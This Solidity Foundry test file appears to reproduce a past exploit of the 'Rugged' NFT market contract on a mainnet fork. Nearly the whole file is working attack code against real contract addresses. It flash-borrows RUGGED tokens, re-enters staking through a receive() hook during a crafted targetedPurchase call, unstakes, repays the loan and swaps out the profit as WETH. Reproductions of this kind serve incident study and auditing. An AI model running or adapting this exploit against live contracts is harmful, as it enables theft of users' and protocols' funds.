// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./IRugged.sol";
import "./IRuggedMarket.sol";

IUniswapV3Pool constant RUGGED_WETH_Pool = IUniswapV3Pool(
    0x99147452078fa5C6642D3E5F7efD51113A9527a5
);
IRuggedMarket constant ruggedMarket = IRuggedMarket(
    payable(0x2648f5592c09a260C601ACde44e7f8f2944944Fb)
);
IRugged constant RUGGED = IRugged(0xbE33F57f41a20b2f00DEc91DcC1169597f36221F);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

contract RuggedArtTest is Test {
    uint256 flashloanAmount = 22 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_262_234 - 1);
        vm.label(address(ruggedMarket), "ruggedMarket");
        vm.label(address(RUGGED), "RUGGED");
        vm.label(address(RUGGED_WETH_Pool), "RUGGED_WETH_Pool");
        vm.label(address(WETH), "WETH");
        vm.label(
            address(0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6),
            "RuggedMarket"
        );
        vm.label(
            address(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD),
            "Universal_Router"
        );

        deal(address(this), 1);
        deal(address(WETH), address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("Eth balance before", WETH.balanceOf(address(this)), 18);

        RUGGED_WETH_Pool.flash(
            address(this),
            flashloanAmount,
            0,
            abi.encode(0)
        );

        RUGGED_WETH_Pool.swap(
            address(this),
            true, //zeroForOne,
            int256(RUGGED.balanceOf(address(this))), //amountSpecified,
            4_295_128_740, // sqrtPriceLimitX96,
            abi.encodePacked(uint8(0x61)) //data
        );
        print("Eth balance after", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;

        // ruggedMarket.claimReward();
        uint256[] memory tokenId = new uint256[](20);
        tokenId[0] = 9721;
        tokenId[1] = 5163;
        tokenId[2] = 2347;
        tokenId[3] = 3145;
        tokenId[4] = 2740;
        tokenId[5] = 1878;
        tokenId[6] = 6901;
        tokenId[7] = 3061;
        tokenId[8] = 1922;
        tokenId[9] = 5301;
        tokenId[10] = 454;
        tokenId[11] = 2178;
        tokenId[12] = 8298;
        tokenId[13] = 4825;
        tokenId[14] = 9307;
        tokenId[15] = 2628;
        tokenId[16] = 6115;
        tokenId[17] = 8565;
        tokenId[18] = 7991;
        tokenId[19] = 4945;

        bytes memory commands = new bytes(1);
        commands[0] = 0x04;
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encodePacked(
            abi.encode(address(0)),
            abi.encode(address(this)),
            abi.encode(1)
        );
        uint256 deadline = block.timestamp;
        RuggedMarket.UniversalRouterExecute memory swapParam = RuggedMarket
            .UniversalRouterExecute({
                commands: commands,
                inputs: inputs,
                deadline: deadline
            });

        ruggedMarket.targetedPurchase{value: 1}(tokenId, swapParam);
        ruggedMarket.unstake(RUGGED.balanceOf(address(this)));
        RUGGED.transfer(address(RUGGED_WETH_Pool), flashloanAmount + fee0);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        data;
        if (amount0Delta > 0) {
            IERC20(IUniswapV3Pool(msg.sender).token0()).transfer(
                msg.sender,
                uint256(amount0Delta)
            );
        } else if (amount1Delta > 0) {
            IERC20(IUniswapV3Pool(msg.sender).token1()).transfer(
                msg.sender,
                uint256(amount1Delta)
            );
        }
    }

    receive() external payable {
        RUGGED.approve(address(ruggedMarket), type(uint256).max);
        RUGGED.balanceOf(address(this));
        ruggedMarket.stake(flashloanAmount);
    }
}
